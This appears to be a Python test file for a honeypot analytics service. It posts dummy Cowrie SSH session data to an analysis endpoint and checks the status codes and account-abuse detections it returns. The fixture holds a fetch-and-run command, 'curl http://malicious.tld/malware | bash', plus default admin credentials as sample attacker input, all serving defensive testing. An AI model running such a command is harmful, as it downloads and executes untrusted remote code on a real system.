import requests
import json

ANALYTICS_ENGINE_URI='http://localhost:5000'
COWRIE_INTERACTION_DUMMY_DATA = {
    'honeypot_type': 'cowrie',
    'honeypot_data': {
        '_id': '616ae052f2aed4046b1adc49',
        'ident': 'd56cb114-99f4-11ea-bec4-080027dc2380',
        'timestamp': '2021-10-16T14:23:14.626Z',
        'normalized': False,
        'payload': {
            'peerIP': '192.168.0.21',
            'commands': ['this is set of test commands', 'uname -a', 'curl http://malicious.tld/malware | bash', 'exit'],
            'loggedin': ['idk what this is', 'todo: work out what this is'],
            'protocol': 'ssh',
            'urls': ['http://malicious.tld/malware'],
            'ttylog': '<ttylog>',
            'hostPort': 22,
            'peerPort': 48740,
            'session': '9d2957b1f695',
            'startTime': '2021-10-16T14:22:58.734191Z',
            'hostIP': '192.168.0.39',
            'credentials': ['admin:admin', 'admin:password'],
            'hashes': ['e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'],
            'endTime': '2021-10-16T14:23:14.628384Z',
            'version': "'SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3'",
            'unknownCommands': []
        },
        'channel': 'cowrie.sessions'
    }
}

def test_response_code_for_valid_data():
    '''this test checks that the correct status code is returned when valid data is submitted'''
    url = ANALYTICS_ENGINE_URI + '/analyze'
    headers = { 'Content-Type': 'application/json' }
    response = requests.post(url=url, data=json.dumps(COWRIE_INTERACTION_DUMMY_DATA), headers=headers)
    assert response.status_code == 200

def test_response_code_for_invalid_data():
    '''this test checks that the correct status code is returned when invalid data is submitted'''
    url = ANALYTICS_ENGINE_URI + '/analyze'
    headers = { 'Content-Type': 'application/json' }
    response = requests.post(url=url, data=COWRIE_INTERACTION_DUMMY_DATA, headers=headers)
    assert response.status_code == 400

def test_signature_detections_on_dummy_data():
    '''this test checks that service is able to report signature detections for the data submitted'''
    url = ANALYTICS_ENGINE_URI + '/analyze'
    headers = { 'Content-Type': 'application/json' }
    response = requests.post(url=url, data=json.dumps(COWRIE_INTERACTION_DUMMY_DATA), headers=headers)
    data = response.json()
    assert data['detections'] == ['T1078_001_default_accounts_cowrie', 'T1078_004_local_accounts_cowrie']
